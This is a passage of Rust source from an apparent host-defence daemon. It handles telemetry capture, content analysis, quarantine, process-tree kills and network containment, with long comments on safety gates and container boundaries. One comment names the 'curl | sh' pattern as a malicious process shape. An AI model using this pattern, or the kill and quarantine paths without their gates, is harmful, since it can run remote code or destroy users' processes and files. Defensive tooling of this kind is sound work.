        // A hash of a file that is still being written is not a lie, it is a
        // hash of what was on disk when the record was made; the record says
        // so by carrying the size beside it.
        let sha256 = bytes
            .filter(|n| *n <= 32 * 1024 * 1024)
            .and_then(|_| util::sha256_file(p).ok());
        let body = self.capture_body(&path, bytes);

        let r = t::file_record(
            &path, verdict, shape, bytes, sha256, body, &self.table, exec_id, &ts,
        );
        self.write_telemetry(&r);
    }

    /// Opt-in body capture for a small script.
    ///
    /// This is the one thing in the telemetry classes that puts file *contents*
    /// anywhere they can be shipped, so it inherits `evidence::is_secret_path`
    /// wholesale — the same function that stops a credential being staged for
    /// an AI — plus a size cap and a "must decode as text" test. A path that
    /// looks like key material is never read at all, whatever the config says.
    fn capture_body(&self, path: &str, bytes: Option<u64>) -> Option<String> {
        if !self.cfg.telemetry.capture_body {
            return None;
        }
        if crate::evidence::is_secret_path(path) {
            return None;
        }
        // Staged evidence and quarantined files are copies of the accused
        // artefact and may be the user's credentials. `moat-ship`'s Guard blanks
        // their *paths* wherever they appear, but a captured body is a separate
        // string it cannot recognise — so the refusal has to be here too, at the
        // only place a body is ever read.
        if path.ends_with(".suspect")
            || Path::new(path).starts_with(&self.cfg.analysis.bundle_dir)
            || Path::new(path).starts_with(self.cfg.paths.quarantine())
        {
            return None;
        }
        let n = bytes?;
        if n == 0 || n > self.cfg.telemetry.capture_body_max_bytes {
            return None;
        }
        let raw = std::fs::read(path).ok()?;
        // Text only. A truncated ELF in a JSON string helps nobody and is a
        // large amount of base64 on the wire for it.
        String::from_utf8(raw).ok()
    }

    fn run_rules_exec(&mut self, exec: &crate::event::ExecEvent, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_exec(exec, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    fn run_rules_hook(&mut self, hook: &HookHit, exec_id: &str, now: u64) -> Vec<Finding> {
        let mut rules = std::mem::take(&mut self.rules);
        let mut out = Vec::new();
        for r in rules.iter_mut() {
            if !r.enabled(&self.cfg) {
                continue;
            }
            let ctx = self.ctx(now);
            out.extend(r.on_hook(hook, exec_id, &ctx));
        }
        self.rules = rules;
        out
    }

    /// Two of the four rarity tuples come from execs alone: "has this parent
    /// ever launched this program" and "has npm ever spawned this". They are
    /// counted here, once, and the result is stashed so an alert about the same
    /// exec quotes it rather than counting it a second time.
    fn record_exec_rarity(&mut self, exec_id: &str, now: u64) {
        let Some(me) = self.table.get(exec_id) else {
            return;
        };
        let exe = me.exe.clone();
        if exe.is_empty() {
            return;
        }
        let parent = self.table.ancestry(exec_id).first().map(|p| p.exe.clone());
        let root = pkgtree::pkg_root_for(&self.table, exec_id).map(|r| r.exe.clone());

        if let Some(parent) = parent {
            let info = self.rarity.observe(
                &Tuple::parent(&exe, &parent),
                now,
            );
            // Bounded: the table is pruned, this map is not, so cap it.
            if self.exec_rarity.len() > 8192 {
                self.exec_rarity.clear();
            }
            self.exec_rarity.insert(exec_id.to_string(), info);
        }
        if let Some(root) = root {
            if root != exe {
                self.rarity
                    .observe(&Tuple::pkg_child(&root, &exe), now);
            }
        }
    }

    fn ctx(&self, now: u64) -> RuleCtx<'_> {
        RuleCtx {
            rarity: &self.rarity,
            cfg: &self.cfg,
            table: &self.table,
            feeds: &self.feeds,
            homes: &self.homes,
            now,
            mode: &self.mode,
            armed: &self.enforcing_rules,
            cred_read_sessions: &self.cred_read_sessions,
            names: &self.names,
        }
    }

    /// A `moat-*` policy event becomes a finding; anything else is
    /// enrichment only (CONTRACT §3).
    ///
    /// Before it does, the event is re-validated against the policy's own
    /// selectors (`selectors.rs`). The kernel has been seen reporting a value
    /// its own filter should have rejected — the SSH-key policy naming
    /// `/sys/devices/system/cpu/online` — and an alert is a claim about what
    /// happened, so such an event becomes a `moat-x-sensor-mismatch` record
    /// instead of a false accusation.
    /// Look at what is actually IN the files a high chain implicated.
    ///
    /// This is the whole trigger surface of `content.rs`, and it is deliberately
    /// this small. moat is not an anti-virus: there is no scan on write, no scan
    /// on exec, no timer. A file is read here only because the correlator
    /// already concluded that a *sequence* of behaviour in one process tree was
    /// worth escalating — the same conclusion that justifies a quarantine and a
    /// kill, both of which are more drastic than reading the bytes.
    ///
    /// **Order matters: this runs before `quarantine_chain_artifacts`.**
    /// Quarantine moves the file into `/var/lib/moat/quarantine`, which is
    /// moat's own store and which `content.rs` refuses outright — so analysing
    /// afterwards would find nothing at the original path and would be refused
    /// at the new one. Analysing first also means the bundle describes the file
    /// as it was when it acted, which is the thing under discussion.
    ///
    /// The findings never move a severity. They are appended to the alert as a
    /// `content` update, which folds into `explain.evidence` for every reader
    /// and into `bundle.md` for the agent. `chain::escalate` and `scoring.rs`
    /// remain the only things that decide how loud anything is.
    fn analyse_chain_artifacts(&mut self, c: &crate::chain::Chain) {
        if !self.cfg.content.enabled {
            return;
        }
        // The stall this pass can add to the event thread, bounded in one
        // number. Measured on this machine: ~4.4 ms per MB, so four files at
        // the 8 MiB cap is ~150 ms in the worst case that never happens, and
        // ~20 ms in the case that does. The hourly budget bounds the hour; this
        // bounds the burst, which is what a reader of the tail actually feels.
        // `note_chain` re-enters as the chain grows and each alert is analysed
        // once, so a wider chain is spread over several passes rather than
        // skipped.
        const MAX_FILES_PER_PASS: usize = 4;
        let mut analysed = 0usize;
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            if analysed >= MAX_FILES_PER_PASS {
                log::debug!(
                    "chain {}: {} files analysed this pass; the rest wait for the next",
                    c.id,
                    analysed
                );
                break;
            }
            let Some(a) = self.find_alert(&step.alert) else { continue };
            // An allowlisted step is the user saying the event is fine; a
            // sequence is not a licence to go back on that, and `chain.rs`
            // already applies the same rule to escalation.
            if a.suppressed_by.is_some() {
                continue;
            }
            // A path a container named is not this machine's path. Reading it
            // here opens a HOST file that merely shares the name and writes
            // what it found onto the alert -- the same mistake `incident`
            // made, in the other reader nobody had looked at. The DISPLAY
            // answer, like capture: this reads rather than acts, so "might be
            // a container" has to mean "do not open it".
            if Self::may_be_container_path(&a) {
                continue;
            }
            // Analysed once. `note_chain` re-enters every time the chain grows,
            // for up to an hour, and without this a five-step chain would read
            // its files once per growth for the whole window.
            //
            // "Once" includes the passes that decided not to read anything: an
            // alert whose files were skipped because the hourly budget was spent
            // keeps that record rather than being retried on the next growth.
            // Retrying is the version of this that re-reads a chain's files
            // every few seconds for an hour as soon as the budget frees, and
            // the record says plainly which of the two happened.
            if !a.content.is_empty() {
                continue;
            }
            // The two files a finding is about: the binary that acted, and the
            // file it touched. `is_own_store` is checked here as well as inside
            // the analyser -- the analyser is the authority, this is the guard
            // that already exists and has already caught this project twice.
            let mut targets: Vec<(&'static str, String)> = Vec::new();
            if !a.process.exe.is_empty() && !self.is_own_store(&a.process.exe) {
                targets.push(("actor", a.process.exe.clone()));
            }
            if let Some(f) = a.file.as_ref() {
                if !f.path.is_empty() && f.path != a.process.exe && !self.is_own_store(&f.path) {
                    targets.push(("target", f.path.clone()));
                }
            }
            let mut found = Vec::new();
            for (role, path) in targets.into_iter().take(MAX_FILES_PER_PASS - analysed) {
                analysed += 1;
                // Reuse the hash the incident snapshot already computed for
                // this file rather than walking it again. When there is none,
                // `Analyzer` hashes the buffer it has to read anyway.
                let known = incident_sha(&a, &path);
                found.push(
                    self.content
                        .analyse(&path, role, known.as_deref(), util::unix_secs()),
                );
            }
            if found.is_empty() {
                continue;
            }
            let value = Value::Array(found.iter().map(|f| f.to_json()).collect());
            for f in &found {
                match &f.skipped {
                    Some(why) => log::info!("chain {}: not reading {}: {}", c.id, f.path, why),
                    None => log::info!(
                        "chain {}: {} is {}, {} bytes, entropy {:.2}, {} marker(s), {} network ref(s)",
                        c.id,
                        f.path,
                        f.kind,
                        f.bytes,
                        f.entropy,
                        f.markers.len(),
                        f.urls.len() + f.hosts.len()
                    ),
                }
            }
            if let Err(e) = self.mark(&a.id, "content", value) {
                log::error!("alert {}: content update: {}", a.id, e);
            }
        }
    }

    /// The one decision behind BOTH acting on a chain and moving its files.
    ///
    /// `maybe_kill_tree` had this reasoning to itself, and quarantine had none
    /// at all: every `high` chain's exec/persist trigger files were moved
    /// aside. On 2026-09-05 at 22:03Z that meant a `critical` chain raised by
    /// the project's own `cargo test` run tried to quarantine
    /// `<repo>/target/release/moatctl` — the developer's build output, deleted
    /// from under them — and failed only because the mount happened to be
    /// read-only. Quarantine is not gentler than a kill; it is the same
    /// judgement with a slower failure. So it asks the same question, gets the
    /// same answer, and its refusal is written to `decisions.jsonl` in the same
    /// words, because the argument for ever trusting either action is a week of
    /// refusals that are all correct.
    fn chain_gate(&self, c: &crate::chain::Chain) -> ChainGate {
        // Facts from the alerts, not from the steps: a step carries no rarity,
        // and rarity is what separates a build from a first run.
        let mut facts: Vec<crate::contain::StepFact> = Vec::new();
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            let Some(a) = self.find_alert(&step.alert) else { continue };
            if a.suppressed_by.is_some() {
                continue;
            }
            facts.push(crate::contain::StepFact {
                family: a.family.clone(),
                novel: matches!(
                    a.rarity,
                    crate::rarity::Rarity::FirstSeen | crate::rarity::Rarity::Rare
                ),
                pid: step.pid,
            });
        }
        let families: Vec<String> = {
            let mut f: Vec<String> = facts.iter().map(|x| x.family.clone()).collect();
            f.sort_unstable();
            f.dedup();
            f
        };
        let mut verdict = crate::contain::worth_killing_for(&c.severity, &facts);
        // Enforcement stops at the namespace boundary, for chains too.
        //
        // `maybe_enforce` refuses a single-event kill into a container; this is
        // the same refusal for the chain path.
        //
        // It governs the TREE KILL and QUARANTINE, and NOT network containment:
        // `maybe_contain` never calls this function. An earlier version of this
        // comment claimed all three and was simply wrong. Containment is scoped
        // instead by the `matchNamespaces` clause in the policy it generates
        // (`contain::policy_yaml`), which is the only thing that ever scoped it.
        //
        // Recorded as a refusal, not a silent skip: `record_decision` writes
        // every spared verdict to decisions.jsonl, and a week of refusals that
        // are all correct is the argument for ever trusting the action.
        if verdict.is_ok() {
            // EVERY trigger must be containerised, not the first one found.
            //
            // A chain can span both sides: a container step beside a host step
            // is what a build that also touches the host looks like. Refusing
            // on the first container member would let one such step veto
            // enforcement for the host half -- so an attacker able to start a
            // container (no privilege beyond docker access) could disarm
            // containment for their real, host-side activity by making sure one
            // container event joined the chain. If any trigger is on this
            // machine, this machine's enforcement still applies.
            //
            // Answered from the ALERT, never from the process table: `exec_id`
            // is `#[serde(skip)]`, so an alert read back through `find_alert`
            // has an empty one and every table lookup here missed. The first
            // version of this did exactly that and was dead code in production
            // as well as in its own test. `process.in_container` and
            // `process.ancestry` are both serialised, which is why the former
            // was put on the record in the first place.
            let triggers: Vec<Alert> = c
                .steps
                .iter()
                .filter(|s| s.is_trigger())
                .filter_map(|s| self.find_alert(&s.alert))
                .collect();
            // `!is_empty()` is belt and braces: `all()` over an empty list is
            // TRUE, and an unresolvable chain must not be refused as
            // containerised -- silence is not evidence. It is currently
            // unreachable, because `facts` is built from the same `find_alert`
            // resolution and `worth_killing_for` already refuses a chain with
            // no facts, so `verdict.is_ok()` above is false first. Kept because
            // that coupling is not a contract, and no test covers it for the
            // same reason: a mutation dropping this guard changes nothing today.
            // The SENSOR only, never the ancestry heuristic: see
            // `containerised_for_enforcement`. A single forged ancestor named
            // `runc` above an attack would otherwise make every one of its
            // descendants look containerised at once, and `all()` is no defence
            // against a shared spoofed ancestor.
            // Complete evidence, or no exemption.
            //
            // `steps` is capped at `chain::MAX_STEPS` (12) and `truncated` says
            // so; the members past the cap are still in `c.members` but without
            // their roles, so "every trigger" here can only ever mean "every
            // trigger MOAT STILL HAS". A later host trigger can sit outside it.
            // Since this grants an exemption from enforcement, partial evidence
            // must not be enough to earn one -- the same direction as
            // `containerised_for_enforcement` treating unknown as not exempt.
            //
            // `filter_map(find_alert)` drops unresolvable steps for the same
            // reason: a step whose alert is gone is not evidence of anything, so
            // requiring the resolvable set to be non-empty AND complete is what
            // makes `all()` mean what it says.
            let resolvable = c.steps.iter().filter(|s| s.is_trigger()).count();
            let all_contained = !triggers.is_empty()
                && !c.truncated
                && triggers.len() == resolvable
                && triggers.iter().all(|a| !Self::may_act_on(a));
            if all_contained {
                verdict = Err("every step of this ran in a container, and moat does not \
                               enforce across a namespace boundary"
                    .to_string());
            }
        }
        ChainGate {
            facts,
            families,
            verdict,
        }
    }

    /// Move the artefacts a chain implicates out of the way.
    ///
    /// This replaces what was going to be a generated `Sigkill` policy for the
    /// dropper's path. That idea did not survive review: the step's `exe` is
    /// the caller before exec (`/usr/bin/python`), so the policy would have
    /// meant "kill any python that execs anything, machine-wide"; and the
    /// dropper's own path is a fresh random directory every run, so matching on
    /// it would never fire twice.
    ///
    /// Quarantine gets at the same thing without a kernel policy and without
    /// anything irreversible: the dropped binary and the persistence artefact
    /// are moved aside, chmod 000, with a manifest recording where they came
    /// from. Re-execution fails because the file is gone; `moatctl quarantine
    /// --restore` puts it back if this was wrong.
    ///
    /// **It passes the same gate a kill does** (`chain_gate`). Moving a file
    /// aside is not the gentle option: it deletes the developer's build output
    /// from where they left it, and the failure is silent until something goes
    /// looking. A chain the kill gate would spare is one moat is not confident
    /// about, and there is no confidence level at which taking someone's files
    /// is right and ending a process is wrong.
    ///
    /// **A `signal`-tier step's file is never moved unless the chain is
    /// `critical`.** A signal rule is a building block by declaration: right
    /// about what it saw, weak about what it means. `moat-exec-untrusted-tmpfs`
    /// names the binary a build just produced under `/tmp` hundreds of times a
    /// day, and acting on the file a weak rule pointed at, on the strength of a
    /// correlation that only reached `high`, is the one shape where this can
    /// destroy work while being technically correct about every step.
    fn quarantine_chain_artifacts(&mut self, c: &crate::chain::Chain) {
        if !self.cfg.contain.enabled {
            return;
        }
        let gate = self.chain_gate(c);
        if let Err(why) = &gate.verdict {
            // The same wording as the kill's own refusal, so `moatctl
            // decisions` reads as one gate that governs both and not two
            // policies that happen to agree.
            let families = gate.families.clone();
            let why = why.clone();
            log::info!("chain {}: not quarantining -- {}", c.id, why);
            self.record_decision(
                &c.id,
                &c.severity,
                &families,
                "quarantine_spared",
                &why,
                &[],
            );
            return;
        }
        let critical = crate::alert::severity_rank(&c.severity)
            >= crate::alert::severity_rank("critical");
        let mut roots = self.homes.clone();
        roots.extend(["/tmp".into(), "/var/tmp".into(), "/dev/shm".into()]);
        let base = self.cfg.paths.quarantine();

        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            // The families whose artefact IS the attack: something dropped and
            // run, and something arranged to run again. A `net` step names no
            // file worth moving, and an allowlisted step names one the user
            // already said was fine.
            if step.family != "exec" && step.family != "persist" {
                continue;
            }
            let Some(a) = self.find_alert(&step.alert) else { continue };
            if a.suppressed_by.is_some() || a.action_taken != "none" {
                continue;
            }
            // Host-only targets, per step. A path named by a container step is
            // that container's file, and its name here is namespace-relative:
            // moving `/app/server` because a container step said so would move
            // a HOST file that merely shares the name. `chain_gate` only decides
            // whether the chain may act at all; a mixed chain reaches this loop
            // with container steps still in it.
            if !Self::may_act_on(&a) {
                log::info!(
                    "chain {}: not quarantining the file named by {} -- it ran in a container, \
                     and that path names a file in the container's filesystem, not this one's",
                    c.id,
                    a.rule
                );
                continue;
            }
            if a.is_building_block() && !critical {
                log::info!(
                    "chain {}: not quarantining the file named by {} -- it is a signal rule and \
                     the chain is {}, not critical",
                    c.id,
                    a.rule,
                    c.severity
                );
                continue;
            }
            let Some(path) = a.file.as_ref().map(|f| f.path.clone()) else { continue };
            if path.is_empty() || !util::under_any(&path, &roots) {
                continue;
            }
            if crate::evidence::is_secret_path(&path) {
                continue;
            }
            match crate::control::quarantine_file(&base, &a.id, &path, &a.rule, &a.title) {
                Ok(dest) => {
                    let _ = self.mark(&a.id, "action_taken", Value::from("quarantined"));
                    log::warn!(
                        "chain {}: quarantined {} -> {}",
                        c.id,
                        path,
                        dest.display()
                    );
                }
                Err(e) => log::error!("chain {}: quarantine {}: {}", c.id, path, e),
            }
        }
    }

    /// What a chain would have killed, and -- only in `kill` mode -- killing it.
    ///
    /// Runs on every `high` chain regardless of mode, because the whole point
    /// of `log` is to gather the evidence that says whether the rules are safe
    /// to act on. Nothing is signalled unless `[contain] kill = "kill"`.
    /// The (binary, destination) pairs a containment may be built from.
    ///
    /// Trigger steps only, unsuppressed, with a destination -- and NOT from a
    /// container. The generated policy is scoped to the host namespace, which
    /// decides where it applies and says nothing about whether the evidence for
    /// it came from this machine: a containerised step naming `/usr/bin/curl`
    /// would otherwise install a policy refusing HOST curl to that destination,
    /// an unprivileged container choosing what the host may not reach. The path
    /// is namespace-relative and names a different file over there.
    ///
    /// A method so a test can call what production calls; the policy load
    /// itself needs a live sensor and so cannot be the observable.
    pub fn host_net_members(
        &self,
        c: &crate::chain::Chain,
    ) -> std::collections::BTreeMap<String, (String, String)> {
        // Only from steps that TRIGGERED. A step the user allowlisted is in the
        // story for context, and a sequence is not a licence to act on
        // something they said was fine.
        let mut members: std::collections::BTreeMap<String, (String, String)> =
            std::collections::BTreeMap::new();
        for step in c.steps.iter().filter(|s| s.is_trigger()) {
            let Some(a) = self.find_alert(&step.alert) else {
                continue;
            };
            if a.suppressed_by.is_some() {
                continue;
            }
            let Some(net) = a.net.as_ref() else { continue };
            if net.dst_ip.is_empty() {
                continue;
            }
            // A container step must not name the binary to block.
            //
            // The policy this builds is scoped to the host namespace, which
            // decides WHERE it applies -- it says nothing about whether the
            // evidence for it came from this machine. A containerised step
            // naming `/usr/bin/curl` would otherwise install a policy refusing
            // HOST curl to that destination: an unprivileged container
            // deciding what the host may not connect to. The path is
            // namespace-relative and names a different file over there.
            if !Self::may_act_on(&a) {
                log::info!(
                    "chain {}: not containing {} — that path was seen in a container, and it \
                     names a different file on this machine",
                    c.id,
                    a.process.exe
                );
                continue;
            }
            members.insert(a.id.clone(), (a.process.exe.clone(), net.dst_ip.clone()));
        }
        members
    }

    /// Drop the targets that are not on this machine.
    ///
    /// `chain_gate` refuses a wholly-container chain; it says nothing about
    /// where a MIXED chain aims. One host trigger permits the chain and
    /// `tree_targets` then returns every trigger pid, container ones included,
    /// so a container build step could be killed because something on the host
    /// in the same tree looked bad. The permit and the aim are different
    /// questions.
    ///
    /// A method rather than an expression inline, so a test can call the thing
    /// production calls: the first test written for this copied the filter into
    /// its own body, which made the mutation check check the test.
    ///
    /// The sensor's answer only, as everywhere an action is decided
    /// (`containerised_for_enforcement`): a forged ancestor named `runc` must
    /// not make a target un-killable either.
    pub fn host_targets(
        &self,
        targets: Vec<crate::contain::Target>,
        chain_id: &str,
    ) -> Vec<crate::contain::Target> {
        targets
            .into_iter()
            .filter(|t| {
                let in_container = self
                    .find_alert(&t.alert)
                    .map(|a| !Self::may_act_on(&a))
                    .unwrap_or(false);
                if in_container {
                    log::info!(
                        "chain {}: sparing pid {} — it is in a container, and moat does not \
                         enforce across a namespace boundary",
                        chain_id,
                        t.pid
                    );
                }
                !in_container
            })
            .collect()
    }

    fn maybe_kill_tree(&mut self, c: &crate::chain::Chain) {
        let mode = self.cfg.contain.kill.clone();
        if mode == "off" {
            return;
        }
        // One decision per chain. `note_chain` re-enters every time the chain
        // grows, for up to an hour: without this, every later trigger in a high
        // tree would be killed as it appeared -- for a build, the rest of the
        // build.
        if self.killed_chains.contains(&c.id) {
            return;
        }

        let gate = self.chain_gate(c);
        let (facts, families) = (gate.facts, gate.families);
        if let Err(why) = gate.verdict {
            self.record_decision(&c.id, &c.severity, &families, "spared", &why, &[]);
            // INFO, not DEBUG. The refusals are the whole point of `log` mode:
            // the argument for ever moving to `kill` is a week of these that
            // are all correct, and at debug level -- which nothing enables --
            // "the gate declined" and "the gate never ran" were the same
            // silence. Found live on 2026-09-05 with kill armed and a chain
            // sitting right there unrefused and unkilled.
            log::info!("chain {}: not killing -- {}", c.id, why);
            return;
        }

        // Is the ancestor itself the actor? `node -e` and `curl | sh` put the
        // malicious process at the root of its own tree.
        let ancestor_families: std::collections::BTreeSet<&str> = facts
            .iter()
            .filter(|f| f.pid == c.ancestor.pid)
            .map(|f| f.family.as_str())
            .collect();
        let spare_ancestor = ancestor_families.len() < 2;

        let targets = self.host_targets(crate::contain::tree_targets(
            &c.steps,
            c.ancestor.pid,
            spare_ancestor,
        ), &c.id);
        // A cap, so a gate that is still wrong costs one build and not a day.
        const MAX_TARGETS: usize = 8;
        let mut named: Vec<String> = Vec::new();
        let mut doomed: Vec<crate::util::PidFd> = Vec::new();
        // Live processes this kill could not reach. Kept separate from
        // `named` because "we decided to spare it" and "we could not touch it"
        // are different outcomes, and only one of them is a fault.
        let mut unpinned: Vec<String> = Vec::new();
        for t in targets.iter().take(MAX_TARGETS) {
            // This target's OWN uid and identity, not the chain's.
            //
            // The chain carried one uid -- whatever the LAST trigger happened
            // to run as -- and it was being applied to every target: a chain
            // spanning two users
            // would check one of them against the other's id and either spare a
            // process it should kill or, worse, pass a process it never
            // established anything about.
            //
            // And a pid is not an identity. `maybe_enforce` verifies start time
            // and executable before signalling, for the pid-reuse reason; the
            // tree kill sends up to eight signals and did not. Between the
            // alert and this loop a pid can be recycled, and the thing wearing
            // it now is not the thing the chain was about.
            let Some(step_alert) = self.find_alert(&t.alert) else {
                // No record, no kill. This used to fall back to the CHAIN's uid
                // and skip verification entirely -- so the one target moat knew
                // least about was the one it checked least. An unresolvable
                // step is not evidence about the process wearing that pid now.
                log::info!(
                    "chain {}: sparing pid {} — its step's alert could not be read, so \
                     nothing is established about it",
                    c.id,
                    t.pid
                );
                continue;
            };
            let target_uid = step_alert.process.uid;
            // Pin the process BEFORE the checks, and signal only through the
            // handle. Everything below -- verification, the uid gate, the
            // SIGSTOP pass, the SIGKILL pass -- used to happen against a bare
            // number, so each step was a fresh chance for the pid to have been
            // recycled underneath it. A handle opened here refers to this
            // process for as long as it is held, and to nothing at all once it
            // dies.
            let handle = match crate::util::PidFd::try_open(t.pid) {
                Ok(h) => h,
                Err(crate::util::PinFailure::Gone) => {
                    log::info!(
                        "chain {}: sparing pid {} (it exited before it could be pinned)",
                        c.id,
                        t.pid
                    );
                    continue;
                }
                // Not "spared": still running, still unsignalled. This used to
                // share the branch above and so reported a live process as one
                // that had exited -- on a pre-5.3 kernel that made enforce mode
                // a silent no-op, and under descriptor exhaustion it hid
                // exactly the wide process tree a kill most needs to cover.
                Err(why) => {
                    log::error!(
                        "chain {}: pid {} ({}) WAS NOT KILLED: {}",
                        c.id,
                        t.pid,
                        t.exe,
                        why
                    );
                    unpinned.push(format!("{} ({}): {}", t.pid, t.exe, why));
                    continue;
                }
            };
            if let Err(why) =
                crate::control::verify_pid(t.pid, &step_alert.process.start_ts, &t.exe)
            {
                log::info!("chain {}: sparing pid {} ({})", c.id, t.pid, why);
                continue;
            }
            if let Some(why) = crate::contain::refuse_to_kill(t.pid, target_uid) {
                // Same reasoning: a spared process is a decision, and a
                // decision nobody can see cannot be reviewed.
                log::info!("chain {}: sparing pid {} ({})", c.id, t.pid, why);
                continue;
            }
            named.push(format!("{} ({})", t.pid, t.exe));
            doomed.push(handle);
        }
        if doomed.is_empty() {
            if !unpinned.is_empty() {
                log::error!(
                    "chain {}: nothing could be killed; {} live process(es) could not be \
                     pinned: {}",
                    c.id,
                    unpinned.len(),
                    unpinned.join(", ")
                );
                self.record_decision(
                    &c.id,
                    &c.severity,
                    &families,
                    "kill_failed",
                    "gate passed, but no implicated process could be pinned",
                    &unpinned,
                );
            }
            return;
        }
        self.killed_chains.insert(c.id.clone());

        if mode != "kill" {
            log::warn!(
                "WOULD HAVE KILLED {} for chain {} ({}): {}",
                doomed.len(),
                c.id,
                c.severity,
                named.join(", ")
            );
            self.record_decision(
                &c.id,
                &c.severity,
                &families,
                "would_have_killed",
                "gate passed; kill mode is log",
                &named,
            );
            return;
        }

        // Stop the whole set before killing any of it, or the first SIGKILL is
        // a starting pistol for whatever the others fork.
        for h in &doomed {
            let _ = h.signal(libc::SIGSTOP);
        }
        let mut killed = 0usize;
        for h in &doomed {
            match h.kill() {
                Ok(()) => killed += 1,
                // A pinned process that would not die is the one case where
                // moat believed it had acted and had not. ESRCH here is benign
                // (it died between the SIGSTOP and the SIGKILL); anything else
                // means it is still running.
                Err(e) => {
                    log::error!("chain {}: pid {} survived SIGKILL: {}", c.id, h.pid, e);
                    unpinned.push(format!("{}: {}", h.pid, e));
                }
            }
        }
        log::warn!("killed {} process(es) for chain {}: {}", killed, c.id, named.join(", "));
        if !unpinned.is_empty() {
            log::error!(
                "chain {}: {} implicated process(es) were NOT killed: {}",
                c.id,
                unpinned.len(),
                unpinned.join(", ")
            );
        }
        self.record_decision(&c.id, &c.severity, &families, "killed", "gate passed", &named);
        self.raise_protection_change(
            &format!("end {} process(es) implicated in one sequence", killed),
            "moat itself, from chain correlation",
            named,
        );
    }

    /// Refuse this sequence's connections, for a while, and nothing else.
    ///
    /// The kernel rule that would have caught this excludes RFC1918, because a
    /// selector cannot tell the developer's own package registry from a C2 on
    /// the same subnet. Userspace can: `moat-net-first-contact` has already
    /// established that nothing on this machine had ever used that destination,
    /// and `chain.rs` has established that it happened inside a sequence worth
    /// interrupting for. So the decision is made here and the enforcement is
    /// handed back to the kernel, scoped to one binary and one address.
    /// A containment policy denied a connection: the thing being contained is
    /// still trying, and the kernel refused it again. Feedback, not a finding.
    ///
    /// Attributed to what the containment RECORD says -- the real binary and
    /// destination it was built from -- never to the refused event's own
    /// sockaddr, which is `0.0.0.0`. No alert is emitted: the containment is
    /// already visible in `moatctl contain` and on the Now page (its trigger
    /// members carry `action_taken: contained`). This only notes that it bit.
    fn note_contain_enforced(&mut self, policy: &str, exec_id: &str, now: u64) {
        let dest = self
            .contain
            .live()
            .iter()
            .find(|c| c.policy == policy)
            .map(|c| c.dests.join(", "))
            .unwrap_or_default();
        let who = self.table.get(exec_id).map(|p| p.exe.clone()).unwrap_or_default();
        log::info!(
            "containment {} held: {} was refused {} again ({})",
            policy,
            if who.is_empty() { "a contained process" } else { &who },
            if dest.is_empty() { "its destination" } else { &dest },
            crate::util::rfc3339_of(now)
        );
    }

    fn maybe_contain(&mut self, c: &crate::chain::Chain, now: u64) {
        if !self.cfg.contain.enabled {
            return;
        }
        if crate::alert::severity_rank(&c.severity) < crate::alert::severity_rank("high") {
            // A chain is re-evaluated every time a step joins it, and it can go
            // DOWN: more steps can turn "a sequence" into "one program doing its
            // job". If this chain was contained while it looked high and no
            // longer does, the containment has outlived the conclusion that
            // justified it and must go.
            //
            // 2026-09-07, live: `dockerd` pulling an image was contained at
            // 13:50:21 and the same chain read `medium` at 13:51:17 -- moat had
            // withdrawn the conclusion and gone on refusing the connection for
            // the rest of the 600 s TTL. Docker and cargo were both cut off
            // from their registries this way. A block that outlives its reason
            // is the worst kind: the evidence for it is gone and the breakage
            // is not.
            // `release` takes it OUT of the store; `release_contain` unloads the
            // kernel policy. Both, or the record lingers claiming a block that
            // is no longer loaded -- which is its own kind of lie.
            if let Some(rec) = self.contain.release(&c.id) {
                log::warn!(
                    "releasing {}: chain {} is {} now, not high -- the containment outlived the \
                     conclusion that justified it",
                    rec.policy,
                    c.id,
                    c.severity
                );
                self.release_contain(&rec);
            }
            return;
        }
        if self.contain.is_contained(&c.id) {
            return;
        }

        let members = self.host_net_members(c);
        let targets = crate::contain::targets(&members);
        // A sequence with nothing outbound in it has nothing to contain. That
        // is most of them, and it is not a failure.
        // EVERY binary that reached out, and every destination it reached.
        //
        // This took `targets.into_iter().next()`, which for the 2026-09-05 lab
        // chain contained `python` -- already exited -- and left the dropped
        // `browser-helper` free to keep beaconing. Containing the process that
        // has finished is not containment.
        if targets.is_empty() {
            return;
        }
        let mut exes: Vec<String> = Vec::new();
        let mut dests: Vec<String> = Vec::new();
        // Private destinations moat chose to alert on rather than refuse.
        let mut declined_lan: Vec<String> = Vec::new();
        for (exe, ds) in targets {
            // BOTH the path tetragon reported and the path it resolves to.
            //
            // `matchBinaries` matches the binary the kernel actually executed,
            // not the name it was invoked by. Tetragon reported `/usr/bin/
            // python` for the 2026-09-05 lab chain; `/usr/bin/python` is a
            // symlink to `python3` to `python3.14`, so a containment naming
            // the reported path loaded, armed, and matched nothing -- the
            // policy was live in enforce mode with a match count of zero while
            // the beacon went straight through it.
            //
            // Proven on this machine rather than reasoned about: a copy of
            // curl under /tmp was refused EPERM to 1.1.1.1:80, and a symlink
            // under /tmp pointing at that same binary outside /tmp reached the
            // same address a second later.
            //
            // Both go in because `In` takes a list and neither is reliably the
            // right one: an interpreter reached through a symlink needs the
            // resolved path, and a binary moatd cannot resolve (deleted,
            // replaced, or on a mount that is gone) still needs the reported
            // one.
            for name in crate::contain::binary_aliases(&exe) {
                if !exes.contains(&name) {
                    exes.push(name);
                }
            }
            for d in ds {
                // NEVER contain an unspecified address. 0.0.0.0 / :: are not a
                // destination -- they are "any", and a containment naming them
                // is at best meaningless and at worst a policy that refuses the
                // binary's connections wholesale. A garbage dest should never
                // reach here now that moatd stops re-parsing its own deny
                // events, but a containment is a policy moatd writes and arms
                // ON ITS OWN JUDGEMENT, so the guard is absolute rather than
                // trusting of its inputs.
                if is_unspecified_dest(&d) {
                    log::warn!("containment: refusing to contain the unspecified address {:?}", d);
                    continue;
                }
                // A LAN address is alerted on, not refused, unless the user
                // asked for `contain.private = "block"`. See the long note on
                // ContainConfig::private: refusing a private destination is
                // where this mechanism's judgement costs the most, and a wrong
                // block is what makes somebody turn protection off for good.
                // The chain, the card and this line still happen; only the
                // refusal is withheld.
                if self.cfg.contain.private != "block" {
                    if let Ok(ip) = d.parse::<std::net::IpAddr>() {
                        if crate::rules::netmatch::is_private(&ip) {
                            log::info!(
                                "containment: WOULD HAVE REFUSED {} -> {} for chain {}, but it is \
